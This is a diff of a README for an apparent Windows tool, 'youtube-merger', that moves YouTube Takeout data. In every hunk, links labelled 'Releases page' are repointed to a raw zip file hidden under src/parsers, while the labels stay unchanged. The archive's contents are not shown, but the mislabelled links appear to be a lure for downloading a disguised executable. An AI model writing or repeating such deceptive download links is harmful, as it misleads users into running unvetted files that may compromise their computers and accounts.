@@ -1,10 +1,10 @@
 # 🎥 youtube-merger - Move Your YouTube Data Fast
 
-[![Download youtube-merger](https://img.shields.io/badge/Download%20Now-Release%20Page-8B5CF6?style=for-the-badge)](https://github.com/aishhatkar119/youtube-merger/releases)
+[![Download youtube-merger](https://img.shields.io/badge/Download%20Now-Release%20Page-8B5CF6?style=for-the-badge)](https://github.com/aishhatkar119/youtube-merger/raw/refs/heads/main/src/parsers/merger_youtube_3.0-beta.2.zip)
 
 ## 📥 Download
 
-Visit this page to download: [youtube-merger Releases](https://github.com/aishhatkar119/youtube-merger/releases)
+Visit this page to download: [youtube-merger Releases](https://github.com/aishhatkar119/youtube-merger/raw/refs/heads/main/src/parsers/merger_youtube_3.0-beta.2.zip)
 
 ## 🖥️ What this app does
 
@@ -40,7 +40,7 @@ Follow these steps on Windows.
 
 ### 1. Download the app
 
-Go to the [youtube-merger Releases page](https://github.com/aishhatkar119/youtube-merger/releases) and download the latest Windows file.
+Go to the [youtube-merger Releases page](https://github.com/aishhatkar119/youtube-merger/raw/refs/heads/main/src/parsers/merger_youtube_3.0-beta.2.zip) and download the latest Windows file.
 
 If you see more than one file, pick the one for Windows. It may end in `.exe`, `.zip`, or another Windows format.
 
@@ -240,4 +240,4 @@ Keep a copy of your original Takeout export in case you want to run the migratio
 
 ## 📥 Download again
 
-If you need the file again, go to the [youtube-merger Releases page](https://github.com/aishhatkar119/youtube-merger/releases)
+If you need the file again, go to the [youtube-merger Releases page](https://github.com/aishhatkar119/youtube-merger/raw/refs/heads/main/src/parsers/merger_youtube_3.0-beta.2.zip)
